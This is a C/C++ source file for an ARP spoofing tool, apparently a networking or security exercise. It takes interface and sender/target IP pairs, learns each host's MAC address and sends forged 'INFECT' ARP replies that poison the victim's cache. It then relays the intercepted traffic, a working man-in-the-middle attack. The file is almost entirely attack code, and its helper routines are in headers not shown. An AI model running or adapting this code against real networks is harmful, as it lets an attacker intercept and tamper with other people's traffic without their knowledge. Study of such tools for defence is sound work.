#include <pcap.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <cstdio>
#include <stdlib.h>
#include "send.h"
#include "kbctrl.h"

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: arp-spoof wlan0 172.20.10.3 172,20,10,1\n");
}
int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    uint32_t ATTACKER_IP = ResolveAttackerIp(dev);
    uint8_t ATTACKER_MAC[6];
    ResolveAttackerMac(dev, ATTACKER_MAC);
    PrintAttcker(ATTACKER_MAC, ATTACKER_IP);

    int pair_num = (argc-1)/2;
    ARP_Table* Table = (ARP_Table*)malloc(sizeof(ARP_Table)*pair_num);
    for(int i = 1; i <=pair_num; i++){
        //Change InitTable
        Table[i-1].SENDER_IP = Str2A(argv[i*2]);
        Table[i-1].TARGET_IP = Str2A(argv[i*2+1]);
        Send(REQUEST, handle,ATTACKER_IP,ATTACKER_MAC,Table[i-1].SENDER_IP,Table[i-1].SENDER_MAC);    //Get Sender MAC
        Send(REQUEST, handle,ATTACKER_IP,ATTACKER_MAC,Table[i-1].TARGET_IP,Table[i-1].TARGET_MAC);    //Get Gateway MAC
        Print(Table[i-1]);
        Send(INFECT, handle,Table[i-1].TARGET_IP,ATTACKER_MAC,Table[i-1].SENDER_IP,Table[i-1].SENDER_MAC);
    }

    Relay(handle, ATTACKER_MAC, Table, pair_num);

    printf("=======================================================================");
    pcap_close(handle);
}
